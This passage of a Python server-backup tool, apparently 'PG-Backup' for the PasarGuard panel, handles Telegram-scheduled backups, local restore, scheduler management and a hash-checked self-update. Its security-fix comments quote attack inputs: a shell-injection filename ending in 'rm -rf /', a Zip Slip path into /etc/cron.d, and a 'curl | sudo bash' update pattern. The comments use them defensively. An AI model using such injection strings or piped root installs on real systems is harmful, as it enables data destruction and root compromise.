            print_info(f"Sleeping {interval_h}h... (next backup at {next_run.strftime('%Y-%m-%d %H:%M:%S')})")
            time.sleep(interval_s)

    except KeyboardInterrupt:
        write_state(instance, "stopped", "")
        print(f"\n  {C.R2}Scheduler stopped.{C.RESET}")

def workflow_backup_bot():
    print_header("Auto Backup to Telegram Bot (Scheduled)")

    include_node = ask_backup_scope()

    bot_token = input(f"  {C.R2}> Bot Token: {C.RESET}").strip()
    while not bot_token:
        bot_token = input(f"  {C.R1}Cannot be empty!{C.RESET}  {C.R2}> Bot Token: {C.RESET}").strip()

    admin_id = input(f"  {C.R2}> Admin Chat ID (numeric): {C.RESET}").strip()
    while not admin_id or not admin_id.lstrip("-").isdigit():
        admin_id = input(f"  {C.R1}Invalid!{C.RESET}  {C.R2}> Admin Chat ID: {C.RESET}").strip()

    proxy = ask_telegram_proxy()

    try:
        interval_h = float(input(f"  {C.R2}> Interval in hours (e.g. 1, 0.5): {C.RESET}").strip())
    except ValueError:
        print_warning("Invalid number. Defaulting to 1.0 hour.")
        interval_h = 1.0

    mode = ask_persistence_mode()

    if mode == "1":
        run_scheduled_backup_loop(bot_token, admin_id, interval_h, include_node, proxy)
        return

    kind_by_mode = {"2": "screen", "3": "tmux", "4": "systemd"}
    kind = kind_by_mode[mode]

    instance_name = ask_instance_name(kind)

    # v4.2: token/chat/proxy go to a 0600 credentials file instead of into
    # the daemon's CLI args (which would otherwise leak via `ps`,
    # /proc/<pid>/cmdline, and the systemd unit file). interval/include_node
    # are stored alongside them so 'Manage Backup Schedulers' can later
    # restart this exact instance or update its token without re-asking.
    write_daemon_creds(instance_name, bot_token, admin_id, proxy,
                        interval_h=interval_h, include_node=include_node)
    daemon_cmd = build_daemon_command(interval_h, include_node, instance=instance_name)

    if mode == "2":
        launch_via_screen(daemon_cmd, session_name=instance_name)
    elif mode == "3":
        launch_via_tmux(daemon_cmd, session_name=instance_name)
    elif mode == "4":
        launch_via_systemd(daemon_cmd, unit_name=instance_name)

# ── Workflow 3: Manual local backup ──────────────────────────
def workflow_manual_backup():
    print_header("Manual Backup (Local)")

    include_node = ask_backup_scope()
    zip_path = create_backup(include_node)
    if zip_path and os.path.exists(zip_path):
        print_success(f"Backup saved: {zip_path}")
    else:
        print_error("Manual backup failed!")

# ── Workflow 4: Manual local restore ─────────────────────────
_SAFE_FILENAME_RE = None

def _is_safe_filename(name):
    """v4.2: validate the user-supplied backup filename before it ever
    touches a shell=True command. Only allow a plain filename (letters,
    digits, dot, dash, underscore) with no path separators — blocks both
    shell metacharacter injection and path traversal (../../etc)."""
    import re
    global _SAFE_FILENAME_RE
    if _SAFE_FILENAME_RE is None:
        _SAFE_FILENAME_RE = re.compile(r"^[A-Za-z0-9_.-]+$")
    return bool(name) and "/" not in name and ".." not in name and bool(_SAFE_FILENAME_RE.match(name))

def workflow_manual_restore():
    print_header("Manual Restore (Local)")

    include_node = ask_backup_scope()
    scope_label  = "PasarGuard + PG-Node" if include_node else "PasarGuard only"
    print_info(f"Scope: {C.BOLD}{scope_label}{C.RESET}")

    zip_name = input(
        f"  {C.R2}> Backup ZIP filename (e.g. backup_full_20260101.zip): {C.RESET}"
    ).strip()

    # v4.2 — SECURITY FIX: this filename used to be interpolated directly
    # into a `shell=True` unzip command with no quoting/validation, which
    # allowed arbitrary shell command injection (e.g. entering
    # "x.zip; rm -rf /") to run as root. Validate it strictly before doing
    # anything else with it.
    if not _is_safe_filename(zip_name):
        print_error("Invalid filename — only letters, digits, '.', '-', '_' are allowed "
                     "(no paths, no shell characters).")
        return

    zip_name = _join_chunks_if_needed(zip_name)
    if not zip_name or not _is_safe_filename(zip_name) or not os.path.exists(zip_name):
        print_error(f"File '{zip_name}' not found in current directory.")
        return

    # v4.2.4 — same sanity check as the transfer workflow: fail fast on a
    # backup with no usable manifest, BEFORE stopping containers and
    # wiping the current install's directories.
    if not _verify_zip_has_manifest(zip_name):
        print_error("Aborting — refusing to restore a backup with no usable "
                     "database manifest. Current install has NOT been touched.")
        return

    confirm = input(
        f"  {C.R1}> WARNING: This will overwrite current config and database. Continue? (y/n): {C.RESET}"
    ).strip().lower()
    if confirm != "y":
        print_warning("Aborted.")
        return

    try:
        if include_node and not stop_compose_local(PG_NODE_DIR, "PG-Node"):
            print_error("Could not stop PG-Node. Aborting.")
            return
        if not stop_compose_local(PASARGUARD_DIR, "Pasarguard"):
            print_error("Could not stop Pasarguard. Aborting.")
            return

        if not clean_dirs_local(include_node):
            print_error("Directory cleanup failed. Aborting.")
            return

        print_info("Extracting backup archive...")
        # v4.2.1 — extract via Python's zipfile module after validating
        # every member against path-traversal (Zip Slip). A malicious
        # archive could carry entries like `../../etc/cron.d/evil` that
        # `unzip -o` would write straight to that path as root.
        try:
            _safe_extract_zip(zip_name, "/opt/pasarguard")
        except (ValueError, zipfile.BadZipFile) as e:
            print_error(f"Refusing to extract archive: {e}")
            return
        except Exception as e:
            print_error(f"Extraction failed: {e}")
            return

        print_info("Restoring PasarGuard data...")
        run_command("cp -a /opt/pasarguard/pasarguard_data/. /var/lib/pasarguard/ 2>/dev/null || true")
        run_command("rm -rf /opt/pasarguard/pasarguard_data")

        if include_node:
            print_info("Restoring PG-Node config and data...")
            run_command("cp -a /opt/pasarguard/pg_node_opt/. /opt/pg-node/ 2>/dev/null || true")
            run_command("cp -a /opt/pasarguard/pg_node_data/. /var/lib/pg-node/ 2>/dev/null || true")
            run_command("rm -rf /opt/pasarguard/pg_node_opt /opt/pasarguard/pg_node_data")

        try:
            backend = _detect_backend_local()
        except Exception as e:
            print_warning(f"Backend detection failed: {e} — assuming legacy postgres")
            backend = {"type": "postgresql", "container": None, "dbname": "pasarguard",
                       "user": "pasarguard", "password": "", "env": {}, "services": [],
                       "host": "127.0.0.1", "port": 5432, "sqlite_path": None}
        print_info(
            f"Detected backend: {C.BOLD}{backend['type']}{C.RESET}  "
            f"db={backend['dbname']}  container={backend['container'] or '(none — sqlite)'}"
        )

        if backend["type"] == "sqlite":
            if not _restore_databases_local("db_dump", None, backend_type="sqlite"):
                raise Exception("SQLite restore failed.")
            if not start_compose_local(PASARGUARD_DIR, "Pasarguard"):
                raise Exception("Pasarguard did not start")
            if include_node and not start_compose_local(PG_NODE_DIR, "PG-Node"):
                print_error("PG-Node did not start.")
            print_header("Local Restore Completed Successfully!")
            print_success("PasarGuard" + (" and PG-Node are" if include_node else " is") + " running.")
            return

        local_db_svc = backend["container"]
        if not local_db_svc:
            raise Exception(f"Could not determine the {backend['type']} container for restore.")
        print_info(f"Detected database service: {local_db_svc}")

        # v4.2.3 — same MySQL data-dir wipe as workflow_transfer (see
        # _wipe_mysql_data_remote for the full rationale). MySQL only
        # honours MYSQL_ROOT_PASSWORD on first init, so a stale data dir
        # on a bind mount would keep the old password and 1045 the restore.
        if backend["type"] in ("mysql", "mariadb"):
            _wipe_mysql_data_local(local_db_svc)

        # v4.2.2 — same backend-aware wait fix as workflow_transfer (see
        # comment there). wait_db_local dispatches by backend_type instead
        # of unconditionally running pg_isready.
        if not start_compose_local(PASARGUARD_DIR, "Pasarguard DB",
                                    services=[local_db_svc], wait_db=True,
                                    backend_type=backend["type"]):
            raise Exception(f"{local_db_svc} did not start")

        if not _restore_databases_local("db_dump", local_db_svc, backend_type=backend["type"]):
            raise Exception("Database restore failed.")

        if not start_compose_local(PASARGUARD_DIR, "Pasarguard"):
            raise Exception("Pasarguard did not start")
        if include_node and not start_compose_local(PG_NODE_DIR, "PG-Node"):
            print_error("PG-Node did not start.")

        print_header("Local Restore Completed Successfully!")
        print_success("PasarGuard" + (" and PG-Node are" if include_node else " is") + " running.")

    except Exception as e:
        print_error(f"Restore error: {e}")
        print_warning("System may be in a partially restored state.")

# ── Workflow 5: Manage running/installed schedulers ───────────
def _systemctl_action(unit_name, action, quiet=False):
    # v4.2.1 — unit_name flows into a shell=True command. Strict validation
    # plus shlex.quote so neither typos nor upstream output quirks can
    # inject extra arguments to systemctl.
    _validate_instance_name(unit_name)
    return run_command(f"systemctl {action} {shlex.quote(unit_name)}.service", quiet=quiet)

def _format_remaining(target_str):
    try:
        target = datetime.datetime.strptime(target_str, "%Y-%m-%d %H:%M:%S")
    except Exception:
        return target_str
    remaining = (target - datetime.datetime.now()).total_seconds()
    if remaining <= 0:
        return "now"
    total_min = int(remaining // 60)
    h, m = divmod(total_min, 60)
    if h > 0 and m > 0:
        return f"{h}h {m}m"
    if h > 0:
        return f"{h}h"
    if m > 0:
        return f"{m}m"
    return "<1m"

def workflow_manage_schedulers():
    print_header("Manage Backup Schedulers")

    items = []
    for suffix, name, active in list_systemd_backup_units():
        items.append(("systemd", name, active))
    for name in list_screen_sessions():
        items.append(("screen", name, True))
    for name in list_tmux_sessions():
        items.append(("tmux", name, True))

    if not items:
        print_warning("No scheduler instances found (systemd service / screen / tmux session).")
        print_info("Create one from 'Auto Backup to Telegram Bot (Scheduled)' first.")
        return

    print(f"  {C.R2}Scheduler instances found:{C.RESET}\n")
    for i, (kind, name, active) in enumerate(items, 1):
        status = f"{C.R1}RUNNING{C.RESET}" if active else f"{C.R3}STOPPED{C.RESET}"
        phase_note = ""
        st = read_state(name)
        if st:
            phase, extra, age = st
            if phase == "backing_up" and age < 3600:
                phase_note = f"  {C.R1}(backing up now){C.RESET}"
            elif phase == "sleeping" and extra:
                phase_note = f"  {C.R3}(sleeping — {_format_remaining(extra)} until next backup){C.RESET}"
            elif phase == "stopped":
                phase_note = f"  {C.R3}(stopped by Ctrl+C){C.RESET}"
        print(f"  {C.R1}{i}{C.RESET}  {C.R3}-{C.RESET}  {C.WH}[{kind:<7}] {name}{C.RESET}   {status}{phase_note}")
    print()

    choice = input(f"  {C.R2}> Select a number to manage (ENTER to cancel): {C.RESET}").strip()
    if not choice:
        return
    try:
        idx = int(choice) - 1
        if idx < 0:
            raise ValueError
        kind, name, active = items[idx]
    except (ValueError, IndexError):
        print_error("Invalid selection.")
        return

    print()
    print(f"  {C.R1}1{C.RESET}  {C.R3}-{C.RESET}  {C.WH}Restart (pick up latest script update){C.RESET}")
    print(f"  {C.R1}2{C.RESET}  {C.R3}-{C.RESET}  {C.WH}Stop{C.RESET}")
    print(f"  {C.R1}3{C.RESET}  {C.R3}-{C.RESET}  {C.WH}Remove completely{C.RESET}")
    print(f"  {C.R1}4{C.RESET}  {C.R3}-{C.RESET}  {C.WH}Update Bot Token / Admin Chat ID{C.RESET}")
    print(f"  {C.R1}5{C.RESET}  {C.R3}-{C.RESET}  {C.WH}Cancel{C.RESET}")
    print()
    act = input(f"  {C.R2}> Choose action for '{name}' (1-5): {C.RESET}").strip()

    if act == "1":
        _restart_scheduler_instance(kind, name)

    elif act == "2":
        if kind == "systemd":
            if _systemctl_action(name, "stop"):
                print_success(f"'{name}' stopped (still installed — start it again anytime).")
            else:
                print_error(f"Failed to stop '{name}'.")
        elif kind == "screen":
            # v4.2.1 — name comes from `screen -list` regex, but defend
            # against any name that smuggles shell metachars in.
            try:
                _validate_instance_name(name)
            except ValueError as e:
                print_error(f"Refusing to act on unsafe session name: {e}")
                return
            if run_command(f"screen -S {shlex.quote(name)} -X quit"):
                print_success(f"Screen session '{name}' stopped.")
            else:
                print_error("Failed to stop the screen session.")
        elif kind == "tmux":
            try:
                _validate_instance_name(name)
            except ValueError as e:
                print_error(f"Refusing to act on unsafe session name: {e}")
                return
            if run_command(f"tmux kill-session -t {shlex.quote(name)}"):
                print_success(f"Tmux session '{name}' stopped.")
            else:
                print_error("Failed to stop the tmux session.")

    elif act == "3":
        confirm = input(
            f"  {C.R1}> This will permanently remove '{name}'. Confirm? (y/n): {C.RESET}"
        ).strip().lower()
        if confirm != "y":
            print_warning("Aborted.")
            return
        if kind == "systemd":
            _systemctl_action(name, "stop", quiet=True)
            _systemctl_action(name, "disable", quiet=True)
            unit_path = f"{SYSTEMD_UNIT_DIR}/{name}.service"
            try:
                if os.path.exists(unit_path):
                    os.remove(unit_path)
                run_command("systemctl daemon-reload", quiet=True)
                # Clean up the credentials file too, since it holds the bot token.
                creds_path = _creds_path(name)
                if os.path.exists(creds_path):
                    os.remove(creds_path)
                print_success(f"Removed systemd scheduler '{name}'.")
            except Exception as e:
                print_error(f"Failed to remove unit file: {e}")
        elif kind == "screen":
            try:
                _validate_instance_name(name)
            except ValueError as e:
                print_error(f"Refusing to act on unsafe session name: {e}")
                return
            run_command(f"screen -S {shlex.quote(name)} -X quit", quiet=True)
            creds_path = _creds_path(name)
            if os.path.exists(creds_path):
                try: os.remove(creds_path)
                except Exception: pass
            print_success(f"Removed screen scheduler '{name}'.")
        elif kind == "tmux":
            try:
                _validate_instance_name(name)
            except ValueError as e:
                print_error(f"Refusing to act on unsafe session name: {e}")
                return
            run_command(f"tmux kill-session -t {shlex.quote(name)}", quiet=True)
            creds_path = _creds_path(name)
            if os.path.exists(creds_path):
                try: os.remove(creds_path)
                except Exception: pass
            print_success(f"Removed tmux scheduler '{name}'.")

    elif act == "4":
        _update_scheduler_credentials(kind, name)

    else:
        print_warning("Cancelled.")

def _restart_scheduler_instance(kind, name):
    """Restart a scheduler instance so it picks up the latest code from
    'Update to Latest Version', without deleting and recreating it.

    - systemd: ExecStart already points at the on-disk script path, so a
      plain `systemctl restart` re-execs the process against whatever code
      is currently on disk — that alone is enough to pick up an update.
    - screen/tmux: the running process is a live Python interpreter that
      already loaded the old code into memory, so a restart has to kill the
      session and spawn a fresh one. We rebuild the exact daemon command
      from the stored credentials/meta file (token/chat/proxy/interval/
      scope) so the user doesn't have to re-enter anything."""
    if kind == "systemd":
        if _systemctl_action(name, "restart"):
            print_success(f"'{name}' restarted and is now running the latest script version.")
        else:
            print_error(f"Failed to restart '{name}'.")
        return

    meta = read_daemon_meta(name)
    if not meta and kind == "systemd":
        # Older scheduler (pre-v4.2) — try to auto-migrate its credentials
        # out of the plaintext unit file before giving up.
        meta = _migrate_legacy_systemd_instance(name)
    if not meta:
        print_error(f"No stored credentials/config found for '{name}' — cannot rebuild it.")
        print_info("Remove it and create a fresh scheduler instance instead.")
        return

    daemon_cmd = build_daemon_command(meta["interval"], meta["node"], instance=name)
    # v4.2.1 — validate + quote before any shell=True use.
    try:
        _validate_instance_name(name)
    except ValueError as e:
        print_error(f"Refusing to act on unsafe session name: {e}")
        return
    q = shlex.quote(name)

    if kind == "screen":
        run_command(f"screen -S {q} -X quit", quiet=True)
        if run_command(f"screen -dmS {q} {daemon_cmd}"):
            print_success(f"'{name}' restarted in a fresh screen session — now running the latest script version.")
        else:
            print_error(f"Failed to restart screen session '{name}'.")
    elif kind == "tmux":
        run_command(f"tmux kill-session -t {q}", quiet=True)
        if run_command(f"tmux new-session -d -s {q} {daemon_cmd}"):
            print_success(f"'{name}' restarted in a fresh tmux session — now running the latest script version.")
        else:
            print_error(f"Failed to restart tmux session '{name}'.")

def _update_scheduler_credentials(kind, name):
    """Let the user change a running scheduler's bot token and/or admin
    chat ID without deleting and recreating the whole instance. Updates the
    0600 credentials file, then restarts the instance so the change takes
    effect immediately (same restart logic as option 1)."""
    meta = read_daemon_meta(name)
    if not meta and kind == "systemd":
        # Older scheduler (pre-v4.2) — try to auto-migrate its credentials
        # out of the plaintext unit file before giving up.
        meta = _migrate_legacy_systemd_instance(name)
    if not meta:
        print_error(f"No stored credentials found for '{name}' — cannot update it.")
        print_info("This can happen for a scheduler created by an older script version")
        print_info("whose unit file could not be auto-migrated.")
        print_info("Remove it and create a fresh scheduler instance instead.")
        return

    print()
    print_info(f"Current admin chat ID: {meta['chat']}")
    print_info(f"Current bot token: {_mask_secret(meta['token'])}")
    print()

    new_token = input(f"  {C.R2}> New Bot Token (ENTER to keep current): {C.RESET}").strip()
    new_chat  = input(f"  {C.R2}> New Admin Chat ID (ENTER to keep current): {C.RESET}").strip()

    if new_chat and not new_chat.lstrip("-").isdigit():
        print_error("Admin Chat ID must be numeric. Aborted — nothing changed.")
        return

    if not new_token and not new_chat:
        print_warning("Nothing entered — no changes made.")
        return

    write_daemon_creds(
        name,
        bot_token=new_token or None,
        admin_id=new_chat or None,
        proxy=meta["proxy"],
        interval_h=meta["interval"],
        include_node=meta["node"],
    )
    print_success(f"Credentials updated for '{name}'.")

    print_info("Restarting so the new credentials take effect...")
    _restart_scheduler_instance(kind, name)

# ── Workflow 6: Update to latest version ──────────────────────
# v4.2.1 — replaced `curl | sudo bash` with a download-then-verify-then-run
# flow: save install.sh to a 0700 temp file (no execution yet), download the
# publisher's install.sh.sha256 if available, abort on SHA256 mismatch, and
# only then exec the saved file with sudo bash. This blunts the most
# catastrophic class of bug in the previous pattern: a compromised
# raw.githubusercontent.com payload no longer gets piped straight into a
# root shell the instant the user types "y".
UPDATE_URL_BASE   = "https://raw.githubusercontent.com/CIAUB/PG-Backup/main"
UPDATE_SCRIPT_URL = f"{UPDATE_URL_BASE}/install.sh"
UPDATE_HASH_URL   = f"{UPDATE_URL_BASE}/install.sh.sha256"

def _download_to(url, dest, timeout=30):
    """Download `url` to `dest` (a filesystem path). Returns True on
    success, False on any failure (with a human-readable error already
    printed)."""
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            data = r.read()
    except Exception as e:
        print_error(f"Could not download {url}: {e}")
        return False
    try:
        fd = os.open(dest, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "wb") as f:
            f.write(data)
    except Exception as e:
        print_error(f"Could not save {dest}: {e}")
        return False
    return True

def _sha256_of(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(64 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()

def workflow_update():
    print_header("Update PG-Backup to Latest Version")
    print_warning("This downloads the official installer/updater from GitHub (CIAUB/PG-Backup),")
    print_warning("verifies its SHA256 against the publisher's hash file (if available),")
    print_warning("and only then runs it as root.")

    confirm = input(f"  {C.R2}> Proceed with update? (y/n): {C.RESET}").strip().lower()
    if confirm != "y":
        print_warning("Aborted.")
        return

    # Private 0700 temp dir — the script + hash files never live in
    # world-readable /tmp while we're working with them.
    tmp_dir = tempfile.mkdtemp(prefix="pgbackup_update_")
    try:
        script_path = os.path.join(tmp_dir, "install.sh")
        hash_path   = os.path.join(tmp_dir, "install.sh.sha256")

        print_info(f"Downloading {UPDATE_SCRIPT_URL} …")
        if not _download_to(UPDATE_SCRIPT_URL, script_path):
            return

        print_info(f"Downloading {UPDATE_HASH_URL} …")
        hash_ok = _download_to(UPDATE_HASH_URL, hash_path)

        if hash_ok:
            try:
                with open(hash_path) as f:
                    expected = f.read().strip().split()[0].lower()
                actual = _sha256_of(script_path)
                if expected != actual:
                    print_error("SHA256 mismatch — refusing to run the installer.")
                    print_error(f"  expected: {expected}")
                    print_error(f"  actual:   {actual}")
                    return
                print_success(f"SHA256 verified: {actual}")
            except Exception as e:
                print_warning(f"Could not parse hash file ({e}) — proceeding anyway.")
        else:
            # v4.2.1 — refuse to silently downgrade. An attacker who can
            # MITM the hash file (or block its download) but not the
            # script itself would otherwise get a free sudo bash. Require
            # the user to opt in explicitly.
            print_warning("Could not download install.sh.sha256 — no integrity check available.")
            print_warning("(Network problem, or the publisher hasn't published a hash file on this branch.)")
            yn = input(
                f"  {C.R1}> Run the unverified installer as root anyway? (y/n): {C.RESET}"
            ).strip().lower()
            if yn != "y":
                print_error("Aborted for safety. The hash file is the only defense against a")
                print_error("tampered installer — without it, running the script is unsafe.")
                return
            print_warning("Proceeding WITHOUT integrity verification at the user's explicit request.")

        print()
        print(hline())
        # Run the saved file (not a network pipe) as root.
        result = subprocess.run(["sudo", "bash", script_path])
    except Exception as e:
        print_error(f"Failed to run updater: {e}")
        return
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)
    print(hline())
    print()

    if result.returncode == 0:
        print_success("Update finished.")
        print_info("Existing running scheduler instances (screen/tmux/systemd) keep running")
        print_info("with the old code in memory — restart them from 'Manage Backup Schedulers'")
        print_info("if you want them to pick up the new version.")
        print_info("Re-run this script to use the updated version.")
    else:
        print_error(f"Updater exited with code {result.returncode}. Check the output above.")

# ── Headless daemon entrypoint (used by screen / tmux / systemd) ──
def run_daemon_from_args():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("--daemon-backup", action="store_true")
    # v4.2: --token/--chat/--proxy are no longer accepted here (they used to
    # leak via `ps`/systemd unit files). Credentials are now read from a
    # 0600 file keyed by --instance. Old flags are still parsed (accepted
    # but ignored with a warning) so a stale unit file from v4.1 doesn't
    # hard-crash — but it also won't leak a working token either.
    parser.add_argument("--token", default=None, help=argparse.SUPPRESS)
    parser.add_argument("--chat", default=None, help=argparse.SUPPRESS)
    # v4.2.1 — --proxy removed entirely. Proxy credentials (often including
    # user:pass@host:port) were leaking via `ps` and /proc/<pid>/cmdline.
    # They live in the 0600 credentials file now, same as token/chat.
    # --proxy is still parsed (silently dropped) so a stale v4.1 daemon
    # command line doesn't hard-crash the unit.
    parser.add_argument("--proxy", default=None, help=argparse.SUPPRESS)
    parser.add_argument("--interval", type=float, required=True)
    parser.add_argument("--node", action="store_true")
    parser.add_argument("--instance", default="default")
    args = parser.parse_args()

    # v4.2.1 — --instance flows into _creds_path(). Reject anything that
    # could escape /etc/pasarguard-backup before opening the file.
    try:
        _validate_instance_name(args.instance, allow_empty=False)
    except ValueError as e:
        sys.stderr.write(f"[pg-backup] invalid --instance value: {e}\n")
        sys.exit(1)

    if args.token or args.chat:
        sys.stderr.write(
            "[pg-backup] --token/--chat CLI args are no longer supported for security "
            "reasons; re-create this scheduler from the menu so credentials are stored "
            "in a 0600 file instead.\n"
        )
        sys.exit(1)

    try:
        token, chat, proxy = read_daemon_creds(args.instance)
    except FileNotFoundError:
        sys.stderr.write(f"[pg-backup] No credentials file found for instance '{args.instance}' "
                          f"in {CREDS_DIR}. Re-create the scheduler from the menu.\n")
        sys.exit(1)

    proxy = args.proxy or proxy  # args.proxy is always None (SUPPRESS) — kept for back-compat
    run_scheduled_backup_loop(token, chat, args.interval, args.node, proxy, args.instance)

# ── Main menu ─────────────────────────────────────────────────
MENU = [
    ("1", "Auto Backup & Transfer to New Server"),
    ("2", "Auto Backup to Telegram Bot (Scheduled)"),
    ("3", "Manual Backup (Save locally)"),
    ("4", "Manual Restore (From local zip)"),
    ("5", "Manage Backup Schedulers (start/stop/restart)"),
    ("6", "Update to Latest Version"),
    ("7", "Exit"),
]

def main():
    while True:
        print_header()

        print(f"  {C.R3}{'─' * 50}{C.RESET}")
        for num, label in MENU:
            if num == "7":
                print(f"  {C.R3}{num}{C.RESET}  {C.R3}-{C.RESET}  {C.R2}{label}{C.RESET}")
            else:
                print(f"  {C.R1}{num}{C.RESET}  {C.R3}-{C.RESET}  {C.WH}{label}{C.RESET}")
        print(f"  {C.R3}{'─' * 50}{C.RESET}")
        print()

        choice = input(f"  {C.R2}> Select option (1-7): {C.RESET}").strip()
        print()

        if choice == "1":
            workflow_transfer()
            pause_and_return()
        elif choice == "2":
            workflow_backup_bot()
            pause_and_return()
        elif choice == "3":
            workflow_manual_backup()
            pause_and_return()
        elif choice == "4":
            workflow_manual_restore()
            pause_and_return()
        elif choice == "5":
            workflow_manage_schedulers()
            pause_and_return()
        elif choice == "6":
            workflow_update()
            pause_and_return()
        elif choice == "7":
            print(f"  {C.R2}Goodbye.{C.RESET}\n")
            sys.exit(0)
        else:
            print_error("Invalid option. Please enter 1-7.")
            time.sleep(1.5)

if __name__ == "__main__":
    if "--daemon-backup" in sys.argv:
        run_daemon_from_args()
    else:
        main()
